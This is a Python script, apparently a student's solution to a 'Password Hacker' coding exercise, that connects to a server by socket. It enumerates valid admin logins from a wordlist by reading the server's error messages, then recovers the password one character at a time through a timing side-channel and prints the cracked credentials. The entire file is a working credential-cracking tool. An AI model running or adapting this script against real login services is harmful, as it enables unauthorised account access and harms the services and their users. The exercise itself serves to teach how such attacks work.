import socket
import sys
import itertools
import json
from datetime import datetime, timedelta



class Hacker(object):

    def __init__(self, ip_address, port):
        self.ip_address = ip_address
        self.port = int(port)
        # self.msg = msg
        self.client_socket = socket.socket()
        self.address = (self.ip_address, self.port)

    def main(self):
        self.client_socket.connect(self.address)

        keys = list(map(chr, range(97, 123)))
        keys.extend(list(map(chr, range(48, 58))))
        keys.extend(list(map(chr, range(65, 91))))
        keys = itertools.cycle(keys)

        got_login = False
        got_password = False
        incomplete_pass = ''
        with open('/home/feztix/documents/coding/python/Password_Hacker/Password Hacker (1)/task/hacking/logins.txt',
                  'r') as admins:
            while not got_password:
                while not got_login:
                    admin = admins.readline().rstrip('\n')
                    credentials = {"login": admin, "password": ' '}

                    self.client_socket.send(json.dumps(credentials).encode(encoding='UTF8'))
                    response = self.client_socket.recv(1024)
                    response = response.decode(encoding='UTF8')
                    response = json.loads(response)
                    if response['result'] == 'Wrong password!':
                        got_login = True
                pass_trial = incomplete_pass + next(keys)

                credentials = {"login": admin, "password": pass_trial}
                starting = datetime.now()
                self.client_socket.send(json.dumps(credentials).encode(encoding='UTF8'))
                response = self.client_socket.recv(1024)
                finish = datetime.now()
                response = response.decode(encoding='UTF8')
                response = json.loads(response)
                if finish - starting >= timedelta(seconds=0.1):
                    incomplete_pass = pass_trial
                elif response['result'] == "Connection success!":
                    credentials = {"login": admin, "password": pass_trial}
                    print(json.dumps(credentials))
                    got_password = True

    def closing(self):
        self.client_socket.close()


args = sys.argv
start = Hacker(*args[1:])
start.main()
start.closing()